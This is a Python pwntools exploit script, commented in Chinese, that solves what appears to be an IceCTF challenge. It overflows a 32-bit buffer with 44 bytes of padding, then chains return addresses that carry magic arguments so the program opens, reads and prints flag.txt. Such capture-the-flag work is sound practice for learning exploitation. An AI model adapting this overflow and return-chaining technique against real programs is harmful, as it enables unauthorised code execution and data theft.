#!/usr/bin/python
#coding:utf-8
#注意ori的中间需要跳过push ebp,用于清除栈中的参数

from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.3', 10001)
		
ret = 0x08048569			#打开flag.txt文件
ori = 0x080485c5			#将flag.txt文件中的内容读取到全局变量dati中，跳过函数开头的push ebp，从而清除掉栈中的magic_ret
pro = 0x0804862c			#输出全局变量dati中的内容，即flag内容

magic_ret = 0xbadbeeef		#ret函数的magic参数，参数数值必须等于magic才能执行功能
magic_ori1 = 0xabcdefff		#ori函数的两个magic参数，参数数值必须等于magic才能执行功能
magic_ori2 = 0x78563412		#ori函数的两个magic参数，参数数值必须等于magic才能执行功能
	
payload = ""
payload += 'A'*44			#padding
payload += p32(ret)			#调用ret函数
payload += p32(ori)			#ret函数结束后返回到ori函数
payload += p32(magic_ret)	#传递给ret函数的参数
payload += p32(pro)			#ori函数结束后返回到pro函数
payload += p32(magic_ori1)	#传递给ori函数的参数
payload += p32(magic_ori2)	#传递给ori函数的参数

print io.recvuntil('messaggio?')
io.send(payload)
flag = io.recvuntil('}')
flag = flag[flag.find('IceCTF'):]	#从输出中过滤flag
log.success('Flag: ' + flag)